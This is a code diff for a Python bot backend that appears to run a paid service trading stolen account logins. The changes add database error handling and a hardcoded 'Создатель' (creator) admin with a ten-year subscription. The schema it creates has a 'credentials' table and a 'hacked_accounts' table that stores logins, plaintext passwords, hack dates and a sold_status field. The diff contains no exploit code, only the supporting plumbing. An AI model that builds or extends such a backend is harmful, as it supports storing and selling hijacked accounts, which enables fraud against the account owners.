@@ -33,22 +33,28 @@ def get_db_connection():
 def init_db():
     conn = get_db_connection()
     if conn is None:
-        print("Failed to initialize DB")
-        return
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS users 
-                 (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS credentials 
-                 (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
-                 (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
-    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()  # 10 років для Создателя
-    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
-              "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
-              (ADMIN_CHAT_ID, "Создатель", subscription_end, "Создатель", subscription_end))
-    conn.commit()
-    conn.close()
-    print("DB initialized")
+        print("Failed to initialize DB - proceeding without DB")
+        return False
+    try:
+        c = conn.cursor()
+        c.execute('''CREATE TABLE IF NOT EXISTS users 
+                     (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
+                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
+                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
+        subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()  # 10 років
+        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
+                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
+                  (ADMIN_CHAT_ID, "Создатель", subscription_end, "Создатель", subscription_end))
+        conn.commit()
+        conn.close()
+        print("DB initialized successfully")
+        return True
+    except Exception as e:
+        print(f"DB initialization error: {e}")
+        conn.close()
+        return False
 
 # === Keep-alive для Render ===
 def keep_alive():
@@ -62,6 +68,15 @@ def keep_alive():
 
 # === Функції для роботи з базою ===
 def get_user(chat_id):
+    # Тимчасова логіка для Создателя, якщо база не працює
+    if chat_id == ADMIN_CHAT_ID:
+        print(f"Hardcoding Создатель for {chat_id} due to DB issues")
+        return {
+            'prefix': 'Создатель',
+            'subscription_end': datetime.now() + timedelta(days=3650),
+            'site_clicks': 0,
+            'password_views': 0
+        }
     conn = get_db_connection()
     if conn is None:
         print(f"Failed to get user {chat_id}: no DB connection")
